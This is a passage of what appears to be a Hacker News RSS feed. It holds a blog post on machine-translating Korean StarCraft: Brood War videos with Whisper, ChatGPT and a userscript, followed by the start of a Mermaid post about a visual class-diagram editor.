cabling, to installing OSes on servers and getting them on the internet.</span></p><p><span>Until then, if any of this excites you, check out our </span><a href="https://railway.com/careers/infra-platform" target="_blank" rel="noreferrer noopener"><span>open Infrastructure Engineering roles</span></a><span> and reach out if they catch your interest.</span></p></section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Brood War Korean Translations (222 pts)]]></title>
            <link>https://blog.sourcedive.net/brood-war-korean-translations/</link>
            <guid>42740596</guid>
            <pubDate>Fri, 17 Jan 2025 17:15:07 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://blog.sourcedive.net/brood-war-korean-translations/">https://blog.sourcedive.net/brood-war-korean-translations/</a>, See on <a href="https://news.ycombinator.com/item?id=42740596">Hacker News</a></p>
<div id="readability-page-1" class="page"><section>
            <p>As work slowed down during the last couple of weeks of 2024, I decided to redirect some of my energy to hobbies instead of work. One such hobby is StarCraft: Brood War (or BW for short), a classic, highly competitive RTS from '98 that still has an active community today.</p><p>Over those couple of weeks, I was able to make great progress in solving a decades-old problem in the BW community, using a mix of LLMs and free (gratis*) software.</p><h2 id="cultural-context">Cultural context</h2><p>Understanding the cultural context BW exists in is crucial to understand the rest of this post. High-level BW is – for all intents and purposes – a Korean game. The overwhelming majority of professional players, teams, and tournaments (as well as most of the passionate audience and community) are based in Korea, and have been for 20+ years. This is so ingrained in the BW culture that us members of the community who <em>are not </em>Korean call ourselves "foreigners," a slightly self-condescending term.</p><p>Similarly to chess, BW is a game of strategy with a long history of recorded games. As such, playing the game is only half the challenge; <em>studying</em> it just as important (especially at higher levels of play). For decades, the BW community (both Korean and foreigner) has watched and analyzed professional matches from years past and derived valuable strategic insights from them. </p><p><em>Note: given the nature of BW as a video game, much of the modern discourse takes place in videos and live streams published by professional BW players.</em></p><p>Continuing to use chess as an analogy, you might know that chess <em>openers</em> are collections of well-studied first moves for chess. The interactions between white-piece openers and black-piece openers have been analyzed for decades (centuries?), and their study is considered fundamental for beginner and intermediate chess players. </p><p>The only aspect of these <em>openers</em> you need to focus on for this post is how these openers <em>shape the language </em>used by the chess community. Terms like "Sicilian defense", and its "Najdork variation", "Dragon variation", or "Accelerated Dragon variation" are all community-developed names. None of these terms are written in the rules of chess. They are part of a <em>domain-specific</em> <em>language</em> the community itself has developed, condensing and communicating the aforementioned decades of study and analysis effectively.</p><p>This association of <em>language</em> and <em>history</em>, combined with the great divide between the Koreans and "foreigners," leads us to what is commonly called the Foreigner Knowledge problem.</p><h2 id="foreigner-knowledge-problem">Foreigner Knowledge problem</h2><p>Very few of members of the foreigner community are fluent in Korean. Foreigner access to Korean BW discourse is a contradicting concept: if you speak Korean fluently, you have no reason to be in the foreigner community, as it only has access to material that is strictly inferior and more limited. For this reason, Korean-speaking members in the foreigner community are <em>exceedingly rare.</em></p><p>In an effort to gain access to the Korean discourse, we have crowdfunded money to pay these (<em>acquiescing</em>) Korean-speaking foreigners to translate the subtitles of YouTube videos. Everyone involved knows the translation work is taxing and slow, and that the pay is objectively terrible. Nevertheless, this approach has afforded the community a few dozen videos a year to be translated.</p><p>As an alternative, we have relied on machine translation of text content instead. While machine translation tools like Google Translate are good at translating everyday sentences, they are ill-suited for <em>domain-specific language</em>s, as they are full of jargon to which the translation tool has not been exposed. To add insult to injury, translating such jargon literally is <em>actually counter-productive</em>.</p><p>To illustrate this, here's an excerpt of the subtitles from a Korean video tutorial, about the BW-equivalent of an <em>opener </em>(called a <em>build order</em>, or simply <em>build</em>):</p><blockquote>안녕하세요 오늘 강의해 드릴 내용은 12 안마당 빌드입니다. 12 안마당의 종류와 장단점들 그리고 빌드 오더를 간단하지만 자세하게 알려드리려고 합니다. 토스전에서는 가장 부유하게 시작하고 싶을 때 사용하는 빌드고요. 테란전에서는 12 안마당으로 할 수 있는 빌드가 여러가지가 있습니다. 그래서 가장 많이 사용하는 빌드들을 몇가지 알려드리려고 합니다. 첫 번째로 투에처리 빌드인데 12 안마당으로 시작하는 빌드입니다. 12 안마당 11 스포닝풀 10가스 이제 빠른 가스를 활용한 빌드인데요. 이 빌드는 투에처리 빌드를 하실때 3에처리를 빠르게 3가스 멀티에 가져가면서 플레이를 할 때 많이 사용을 하고요. 두번째로 12압 12풀 12가스 적당히 빠른 테크트리와 적당히 빠른 3에처리 빌드입니다. 12압 12가스 적당히 빠른 테크트리와 적당히 빠른 3에처리 빌드입니다. 이 빌드 같은 경우는 흔히들 말하는 안 3에처리라고 많이들 얘기를 하는데 뮤탈리스크도 빠르고 3에처리도 빠른 그런 빌드라고 생각하시면 되요. </blockquote><p>And here is the Google Translate version:</p><blockquote>Hello, today's lecture is about the 12 courtyard build. I will briefly but in detail explain the types, pros and cons of the 12 courtyard, and the build order. In the Toss match, it is the build used when you want to start the most affluently. In the Terran match, there are various builds that can be done with the 12 courtyard. So I will tell you about some of the most used builds. The first is the two-processing build, which starts with the 12 courtyard. 12 courtyard 11 spawning pool 10 gas Now, this is a build that utilizes fast gas. This build is often used when playing with the two-processing build while quickly bringing the 3-processing to the 3-gas multi. The second is the 12 pressure 12 pool 12 gas moderately fast tech tree and moderately fast 3-processing build. 12 pressure 12 gas moderately fast tech tree and moderately fast 3-processing build. In the case of this build, many people talk about it as a build that is fast at both Mutalisk and 3-point processing.</blockquote><p>You might be confused if you are not a BW player. Consider yourself lucky, because I promise you you'd be <em>flabbergasted </em>if you <em>did</em> play the game.</p><p>Anyone familiar with BW will tell you that translation's signal-to-noise ratio is over 9000. There are no "courtyards" in BW. "Starting off the most affluently" is an awkward and verbose way to say "this is an economic opener/build." <em>What the hell is a "3-point processing"?!</em></p><p>Sure, there are a few other recognizable... <em>utterances</em>, such as "Toss" (Protoss), "build", "fast gas", "moderately fast tech-tree" and "Terran" – but the overwhelming majority of it has been translated <em>literally</em> and is nothing but noise, destroying any context that might have redeemed those few recognizable bits.</p><p>The combination of poor automatic subtitles and literally-translated jargon has caused the Foreigner community to lag behind the Korean community <em>for decades</em>.</p><h2 id="the-new-translation-process">The new translation process</h2><p>This is what we are now able to achieve with my new machine translation process:</p><blockquote>Hello, today's lecture will cover the 12 Natural build. I’ll explain the types, pros, and cons of the 12 Natural build and provide a simple yet detailed build order. This build is used when you want to start the most economically against Protoss. Against Terran, there are multiple builds you can use with the 12 Natural. I’ll go over some of the most popular ones. The first one is the two-Hatchery build. Starting with the 12 Natural allows for the most economically strong opening. The 12 Natural goes with an 11 Spawning Pool and a 10 Gas. This is a build utilizing fast gas. It's often used to play with a quick third Hatchery and three gas expansions when doing the two-Hatchery build. The second is the 12 Hatch, 12 Pool, 12 Gas. It's a balanced build with a moderate tech tree and a moderately fast third Hatchery. First, I’ll briefly talk about a quick defense build strategy. Next, we’ll discuss how you can manage resources optimally for this setup and handle transitions smoothly. Though there are risks, it allows for a stable and dynamic approach in longer games. </blockquote><p>Even for non-players, the above translation should be much more reasonable than the previous Google Translate version. For BW players, it is immediately clear what the video is about. While this is by no means a <em>perfect</em> translation (there are improvements to be made, as will be noted in the footer of this post), the signal-to-noise ratio has been dramatically reduced.</p><p>Furthermore, in contrast to the previous pace of a few dozen videos a year, I ended up translating about 7 videos in a single day. As a single person. During my spare time.</p><p>The least I can say is: <em>from now on, this is the worst this will ever be!</em></p><h2 id="tech-stack">Tech stack</h2><p>The process is divided into two parts: <em>producing</em> subtitles, and <em>consuming</em> subtitles. The "production" part is aimed at members of the community who are up to date with the Korean content, and know which videos should be prioritized. The "consumption" part is aimed at everyone else who simply want to watch the translated videos.</p><h2 id="producing-subtitles">Producing subtitles</h2><h3 id="yt-dlp-openai-whisper">yt-dlp + OpenAI Whisper</h3><p>I initially used yt-dlp to download YouTube's automatic Korean subtitles to try and translate them. As shown above, though, they are useless. So instead of downloading the subtitles, I use yt-dlp to download the <em>audio track</em> of the videos.</p><p>With the audio tracks downloaded, I transcribed my own subtitles from them using Whisper. I am not sure why, but transcribing the Korean subtitles using AI (rather than whatever it is YouTube uses) provided much more clean and complete results. It also seems to do a better job of ignoring in-game sounds and other noise (such as mouse clicks).</p><p>When I first started developing this process, I was running Whisper locally, using ~10GB of VRAM. I quickly saw that this would be far too restrictive if I wanted to have others collaborators translating (install Python on Windows, create a venv, install CUDA, install git...). So, I decided to find an alternative.</p><h3 id="google-colab">Google Colab</h3><p>Whisper is installed through Python's pip, and Google Colab is not just a free Jupyter notebook service – it also offers <em>free GPU</em>s, which happen to have just enough VRAM to run Whisper!</p><p>Creating a notebook and sharing a parameterized, read-only version of it was an ideal distribution model for this kind of work. With a little documentation, it allowed non-technical people to run it effortlessly, no matter their hardware. Furthermore, I could update the notebook with features (aka bugs), and people would receive those updates automatically (ie. making it even more accessible, no git cloning, no constant downloads).</p><p>The notebook I created receives one parameter – the YouTube URL – and generates+downloads an SRT file in Korean.</p><p>All of this was neat, but I still hadn't done the fundamental work of translating from Korean to English.</p><h3 id="llms-and-the-slang-dictionary">LLMs and the slang dictionary</h3><p>To say that this entire project stands on the shoulders of giants would be an understatement.</p><p><strong>TeamLiquid</strong> (TL) is the longest, oldest foreigner (or at least, american) BW community. As it turns out, sometime around 15 years ago, one TL member called <strong>konadora </strong>created <a href="https://tl.net/forum/brood-war/93316-the-korean-terminology-thread?ref=blog.sourcedive.net" rel="noreferrer">a forum post</a> with a dictionary of "BW slang used by commentators." I copied the post into a simple markdown file, <strong><code>KoreanSlang.txt</code></strong>, and provided it to the modern era's favorite piece of technology: an LLM!</p><p>Despite the multiple (<em>and multiplying) </em>misuses of LLMs, this problem was fundamentally a language problem, which is a perfect use of LLMs.</p><p>Using this prompt:</p><blockquote>I will give you subtitles for you to translate from Korean to English, using the "KoreanSlang.txt" file for support. Always consider that the content you are translating exists within the context of Starcraft: Brood War. Feel free to adapt the translation, as clarity is more important than a literal translation. Always respect the timestamps and the file formatting, but feel free to correct duplicate subtitles or obvious mistakes. Short "translator notes" may be welcome if appropriate (embedded as subtitles). Do not add quotation marks if they were not present originally. Some of the subtitles may have some noise or errors; please replace them with "(unintelligible)" if you find them. Format the output as code (ie. surrounded by triple back-ticks) for easier copy-pasting.</blockquote><p>And a Pro (Premium? Plus? who knows) ChatGPT account, it was a simple matter of providing the Korean subtitles generated by Whisper, and asking it to translate its contents.</p><p>At first, I simply took translated subtitles, downloaded the corresponding video, and applied them using my local video player –  which meant that, once again, I had to figure out a way to make these subtitles <em>accessible</em> to others.</p><p><em>Note: No altruism or aspiration for good product design played a part in this. My ISP imposes a data cap, and charges me double if I ever exceed it – so downloading videos left and right was <u>not</u> an option! &gt;:(</em></p><h2 id="consuming-subtitles">Consuming subtitles</h2><p>A big consideration is that YouTube has its own subtitles feature, but only the video owner can set or update a video's subtitles. Wanting to avoid the whole <em>download</em>, <em>re-upload</em>, <em>set subtitle</em> work cycle, I decided to <a href="https://xkcd.com/1319/?ref=blog.sourcedive.net" rel="noreferrer">build a solution that was accessible and saved me time </a>(and bandwidth).</p><h3 id="tampermonkey">TamperMonkey</h3><p>I wrote a <a href="https://github.com/Gooseheaded/bwkt-client/raw/refs/heads/master/bwkt-client.user.js?ref=blog.sourcedive.net" rel="noreferrer">UserScript</a> that adds a button to YouTube videos, and downloads the corresponding translated subtitles if they exist. It is able to parse SRT and VTT files, and shows them in a tiny little container below the YouTube player.</p><p>It looks like a button straight from Web 1.0, and I love it. I call it the <strong>BWKT Client</strong>.</p><p>And, well... the mention of a Client implies the existence of a Server.</p><h3 id="pastebin">Pastebin</h3><p>Subtitles are fundamentally text files, and I needed a quick and easy way to share text files. <strong>Pastebin </strong>immediately came to mind as a potential candidate, if only for the proof-of-concept. It is simple to use, I have a premium account for it, and I did not (and still do not) expect traffic to be a concern in any way.</p><p><em>Note: there is nothing more permanent than a temporary solution.</em></p><h3 id="google-sheets-apps-script">Google Sheets + Apps Script</h3><p>All I need is two columns: <em>YouTube URL</em>, and <em>Subtitle URL</em> (and maybe a third column, <em>Language</em>, but that's for later). Using Google Sheets as a database is ideal for this use case, as it is extremely easy to manually inspect and update, and it is also trivial to share with others. </p><p>The cherry on top is Google's <strong>Apps Script</strong>, which is basically a JavaScript runtime that has first-party access to Google Workspace, which includes Google Sheets; and it has a <em>built-in web server</em> to boot!</p><p>It was literally a matter of writing <code>function doGet(req) { /* ... */ }</code> , which receives a YouTube video ID (the eleven-character identified at the end of https://youtube.com?v=XXXXXXXXXXX), and returns the corresponding pastebin URL.</p><h2 id="improvements">Improvements</h2><p>There are certainly improvements to be made. I still see this project as a hacked-together contraption <em>built over the course of two weeks</em>, with a budget of ~$30 USD (I paid for ChatGPT and more GPU time in Colab, neither of which are strictly required but were nice to have).</p><p>One such improvement is supporting multiple languages in the UserScript. After all, the Foreigner community comprises not just American players, but also Mexican, Polish, Romanian, Chinese, Taiwanese – there's dozens of languages that these videos could be translated to, and it would take only a small amount of effort to do.</p><p>There are technical improvements to be made as well. For example: right now, the BWKT Client shows the button below <em>every</em> YouTube video, even if subtitles are not available for that particular video. I could (should?) add another endpoint to the AppsScript web server that returns an index of translated videos, and then the extension could show/hide the button appropriately.</p><p>Note: Speaking of which, <a href="https://sites.google.com/view/bwkt/home?ref=blog.sourcedive.net" rel="noreferrer">here is the public-facing, read-only database</a>!</p><h2 id="shipping-it">Shipping it</h2><p>After all was said and done, I reached out to a few fellow BW enjoyers to put the subtitles to the test. The intention was to judge the quality of the translation process and to see if the subtitles worked well on YouTube. We hopped on a Voice Chat, I streamed my screen, and we started watching a 13-minute long video.</p><p>About 5 minutes in, I had to pause the video and take a step back. As it turns out, the group had been watching the video, and reading the subtitles, yes – but we also had been making comments among ourselves, replaying short clips from the video, pausing it to discuss... and in the middle of it all, we had forgotten what we were originally trying to do: evaluating the quality of the subtitles.</p><p>Needless to say, the subtitles passed the test. :)</p><h2 id="final-thoughts">Final thoughts</h2><p>One sneaky aspect of this project that worked well in my favor is that performance is not critical, nor is scale, or latency, or anything else that most software projects often deal with. Most of what I did was glue already-existing solutions together. </p><p>The custom business logic (the UserScript, and the Python code in the Colab notebook) is short, and effortlessly maintainable. The web server is the simplest production CRUD system ever, and I see no reason for it to ever grow in complexity in any significant way.</p><p>It's the jankiest project I have shipped, and I love it.</p>
        </section></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Show HN: GUI for editing Mermaid class diagrams (150 pts)]]></title>
            <link>https://docs.mermaidchart.com/blog/posts/gui-for-editing-mermaid-class-diagrams</link>
            <guid>42738656</guid>
            <pubDate>Fri, 17 Jan 2025 15:36:01 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://docs.mermaidchart.com/blog/posts/gui-for-editing-mermaid-class-diagrams">https://docs.mermaidchart.com/blog/posts/gui-for-editing-mermaid-class-diagrams</a>, See on <a href="https://news.ycombinator.com/item?id=42738656">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="page">   <main id="page-content">     <div>  <p><span><time datetime="postDate">17 January 2025</time></span> <span data-svelte-h="svelte-155f0sa">•</span> <span>5 mins</span></p>  <!-- HTML_TAG_START -->
<h3 id="enhancing-mermaid-class-diagrams-with-the-new-visual-editor-features">Editing Mermaid Class Diagrams with the Visual Editor</h3>



<p>Mermaid charts are widely used for their ability to represent complex diagrams quickly, and now, thanks to a new update, editing&nbsp;<strong>Mermaid Class Diagrams</strong>&nbsp;has become even easier and more intuitive. The latest feature extends the&nbsp;<strong>Visual Editor</strong>&nbsp;to support direct interaction with class diagrams, offering users a variety of tools to enhance their diagramming experience.</p>



<p>In this blog post, we’ll walk you through the new features in the&nbsp;<strong>Mermaid Visual Editor</strong>, how to use them, and what changes have been made to streamline editing class diagrams. Let’s dive in!</p>



<h3 id="what-are-class-diagrams"><strong>What Are Class Diagrams?</strong></h3>



<p>Class diagrams are a type of&nbsp;<strong>UML (Unified Modeling Language)</strong>&nbsp;diagram used to model the structure of a system by showing its classes, attributes, methods, and the relationships between objects. They are a fundamental tool in object-oriented design and help visualize how different parts of a system interact with each other.</p>



<p>In a class diagram:</p>



<ul>
<li><strong>Classes</strong>&nbsp;represent entities, such as objects or concepts.</li>



<li><strong>Attributes</strong>&nbsp;are the properties or characteristics of classes.</li>



<li><strong>Methods</strong>&nbsp;are the actions or operations that a class can perform.</li>



<li><strong>Relationships</strong>&nbsp;(e.g., associations, inheritance) show how classes are connected or interact.</li>
</ul>



<p>Here’s an example of a&nbsp;<strong>basic Mermaid class diagram</strong>&nbsp;when rendered by Mermaid:</p>



<figure><img data-recalc-dims="1" loading="lazy" decoding="async" width="1024" height="805" data-attachment-id="1850" data-permalink="https://content.mermaidchart.com/2025/01/17/gui-for-editing-mermaid-class-diagrams/pasted-image-20250117132843/" data-orig-file="https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/Pasted-image-20250117132843.png?fit=1534%2C1206&amp;ssl=1" data-orig-size="1534,1206" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Pasted image 20250117132843" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/Pasted-image-20250117132843.png?fit=300%2C236&amp;ssl=1" data-large-file="https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/Pasted-image-20250117132843.png?fit=1024%2C805&amp;ssl=1" src="https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/Pasted-image-20250117132843.png?resize=1024%2C805&amp;ssl=1" alt="" srcset="https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/Pasted-image-20250117132843.png?resize=1024%2C805&amp;ssl=1 1024w, https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/Pasted-image-20250117132843.png?resize=300%2C236&amp;ssl=1 300w, https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/Pasted-image-20250117132843.png?resize=768%2C604&amp;ssl=1 768w, https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/Pasted-image-20250117132843.png?resize=1200%2C943&amp;ssl=1 1200w, https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/Pasted-image-20250117132843.png?w=1534&amp;ssl=1 1534w" sizes="auto, (max-width: 1000px) 100vw, 1000px"><figcaption>Basic Mermaid Class Diagram</figcaption></figure>



<p>This is the code that generated the diagram:</p>



<pre><code><code>classDiagram
    ClassA &lt;|-- ClassB
    ClassB : +String name
    ClassB : +int age
    ClassB : +void displayDetails()
    ClassC o-- ClassB
    ClassC : +String description</code></code></pre>



<p>Looking at the code, you can see how it represents the diagram:</p>



<ul>
<li><strong>ClassA</strong>&nbsp;is a parent of&nbsp;<strong>ClassB</strong>, indicated by&nbsp;<code>&lt;|--</code>.</li>



<li><strong>ClassB</strong>&nbsp;has two attributes (<code>name</code>&nbsp;and&nbsp;<code>age</code>) and one method (<code>displayDetails()</code>).</li>



<li><strong>ClassC</strong>&nbsp;has an&nbsp;<strong>association</strong>&nbsp;(denoted by&nbsp;<code>o--</code>) with&nbsp;<strong>ClassB</strong>&nbsp;and an attribute&nbsp;<code>description</code>.</li>
</ul>



<p>Previously, creating or editing such diagrams would require manually writing or modifying the Mermaid syntax. Now, with the new&nbsp;<strong>Visual Editor</strong>, you can easily create and update these diagrams with just a few clicks.</p>



<h3 id="new-visual-editor-tools-for-class-diagrams"><strong>New Visual Editor Tools for Class Diagrams</strong></h3>



<p>The&nbsp;<strong>Visual Editor Toolbar</strong>&nbsp;introduces several new tools for class diagrams:</p>



<ul>
<li><strong>Change Diagram Rendering Direction</strong>: Adjust the diagram’s layout, whether it’s top-down, left-right, etc.</li>



<li><strong>Add New Classes</strong>: Easily add new classes to the diagram.</li>



<li><strong>Add Titles and Notes</strong>: Add a title to the diagram or insert notes not linked to specific classes.</li>



<li><strong>Add Empty Namespaces</strong>: Define a placeholder for classes that belong to a specific namespace.</li>



<li><strong>Update Diagram Configuration</strong>: Toggle options like the visibility of the&nbsp;<strong>“empty members box”</strong>&nbsp;for a cleaner look.</li>



<li><strong>Change Theme and Layout</strong>: Select from various themes and adjust the look and feel of the diagram for better presentation.</li>
</ul>



<figure><img data-recalc-dims="1" loading="lazy" decoding="async" width="1621" height="870" data-attachment-id="1869" data-permalink="https://content.mermaidchart.com/2025/01/17/gui-for-editing-mermaid-class-diagrams/pasted-image-20250117133806/" data-orig-file="https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/Pasted-image-20250117133806.png?fit=1621%2C870&amp;ssl=1" data-orig-size="1621,870" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="Pasted image 20250117133806" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/Pasted-image-20250117133806.png?fit=300%2C161&amp;ssl=1" data-large-file="https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/Pasted-image-20250117133806.png?fit=1024%2C550&amp;ssl=1" src="https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/Pasted-image-20250117133806.png?resize=1621%2C870&amp;ssl=1" alt="" srcset="https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/Pasted-image-20250117133806.png?w=1621&amp;ssl=1 1621w, https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/Pasted-image-20250117133806.png?resize=300%2C161&amp;ssl=1 300w, https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/Pasted-image-20250117133806.png?resize=1024%2C550&amp;ssl=1 1024w, https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/Pasted-image-20250117133806.png?resize=768%2C412&amp;ssl=1 768w, https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/Pasted-image-20250117133806.png?resize=1536%2C824&amp;ssl=1 1536w, https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/Pasted-image-20250117133806.png?resize=1200%2C644&amp;ssl=1 1200w" sizes="auto, (max-width: 1000px) 100vw, 1000px"><figcaption><em>Theme Customization in Toolbar</em></figcaption></figure>



<p>With these tools, you can interact with your diagrams dynamically, significantly reducing the effort required to manage complex relationships and attributes.</p>



<h3 id="creating-new-classes-and-relationships"><strong>Creating New Classes and Relationships</strong></h3>



<p>One of the most powerful features of the new editor is its intuitive way of adding new classes and establishing relationships between them. Here’s how it works:</p>



<ul>
<li><strong>Create a New Class with an Existing Relationship</strong>: Click on an existing class in your diagram, then drag to an empty space. A new class will appear with a direct relationship to the original class.</li>



<li><strong>Create Relationships Between Existing Classes</strong>: Quickly establish relationships between existing classes by dragging from one class and dropping the relationship line onto another class. This eliminates the need for manual code input.</li>
</ul>



<figure><img data-recalc-dims="1" loading="lazy" decoding="async" width="1460" height="861" data-attachment-id="1861" data-permalink="https://content.mermaidchart.com/2025/01/17/gui-for-editing-mermaid-class-diagrams/new-class-mermaid/" data-orig-file="https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/new-class-mermaid.png?fit=1460%2C861&amp;ssl=1" data-orig-size="1460,861" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="new-class-mermaid" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/new-class-mermaid.png?fit=300%2C177&amp;ssl=1" data-large-file="https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/new-class-mermaid.png?fit=1024%2C604&amp;ssl=1" src="https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/new-class-mermaid.png?resize=1460%2C861&amp;ssl=1" alt="" srcset="https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/new-class-mermaid.png?w=1460&amp;ssl=1 1460w, https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/new-class-mermaid.png?resize=300%2C177&amp;ssl=1 300w, https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/new-class-mermaid.png?resize=1024%2C604&amp;ssl=1 1024w, https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/new-class-mermaid.png?resize=768%2C453&amp;ssl=1 768w, https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/new-class-mermaid.png?resize=1200%2C708&amp;ssl=1 1200w" sizes="auto, (max-width: 1000px) 100vw, 1000px"><figcaption><em>Creating Relationships Between Classes</em></figcaption></figure>



<p>When working with relationships, you can click on any existing connection to bring up a toolbar. This toolbar allows you to:</p>



<ul>
<li>Change the type of relationship (e.g., inheritance, association).</li>



<li>Set the cardinalities (e.g., one-to-many, many-to-many).</li>



<li>Add labels to relationships by double-clicking on the connection.</li>
</ul>



<figure><img data-recalc-dims="1" loading="lazy" decoding="async" width="1414" height="938" data-attachment-id="1863" data-permalink="https://content.mermaidchart.com/2025/01/17/gui-for-editing-mermaid-class-diagrams/edit-relation/" data-orig-file="https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/edit-relation.png?fit=1414%2C938&amp;ssl=1" data-orig-size="1414,938" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="edit-relation" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/edit-relation.png?fit=300%2C199&amp;ssl=1" data-large-file="https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/edit-relation.png?fit=1024%2C679&amp;ssl=1" src="https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/edit-relation.png?resize=1414%2C938&amp;ssl=1" alt="" srcset="https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/edit-relation.png?w=1414&amp;ssl=1 1414w, https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/edit-relation.png?resize=300%2C199&amp;ssl=1 300w, https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/edit-relation.png?resize=1024%2C679&amp;ssl=1 1024w, https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/edit-relation.png?resize=768%2C509&amp;ssl=1 768w, https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/edit-relation.png?resize=1200%2C796&amp;ssl=1 1200w" sizes="auto, (max-width: 1000px) 100vw, 1000px"><figcaption><em>Editing Relationships and Cardinalities</em></figcaption></figure>



<p>These controls make it easy to iterate on your diagram as your design evolves.</p>



<h3 id="editing-class-details"><strong>Editing Class Details</strong></h3>



<p>The Visual Editor provides a powerful dialog interface for modifying class properties without touching any code. When you double-click on a class in your diagram, a comprehensive editing panel appears that lets you fine-tune every aspect of the class definition.</p>



<figure><img data-recalc-dims="1" loading="lazy" decoding="async" width="2148" height="1354" data-attachment-id="1864" data-permalink="https://content.mermaidchart.com/2025/01/17/gui-for-editing-mermaid-class-diagrams/edit-class/" data-orig-file="https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/edit-class.png?fit=2148%2C1354&amp;ssl=1" data-orig-size="2148,1354" data-comments-opened="1" data-image-meta="{&quot;aperture&quot;:&quot;0&quot;,&quot;credit&quot;:&quot;&quot;,&quot;camera&quot;:&quot;&quot;,&quot;caption&quot;:&quot;&quot;,&quot;created_timestamp&quot;:&quot;0&quot;,&quot;copyright&quot;:&quot;&quot;,&quot;focal_length&quot;:&quot;0&quot;,&quot;iso&quot;:&quot;0&quot;,&quot;shutter_speed&quot;:&quot;0&quot;,&quot;title&quot;:&quot;&quot;,&quot;orientation&quot;:&quot;0&quot;}" data-image-title="edit-class" data-image-description="" data-image-caption="" data-medium-file="https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/edit-class.png?fit=300%2C189&amp;ssl=1" data-large-file="https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/edit-class.png?fit=1024%2C645&amp;ssl=1" src="https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/edit-class.png?resize=2148%2C1354&amp;ssl=1" alt="" srcset="https://i0.wp.com/content.mermaidchart.com/wp-content/uploads/2025/01/edit-class.png?w=2148&amp;ssl=1 2148w, 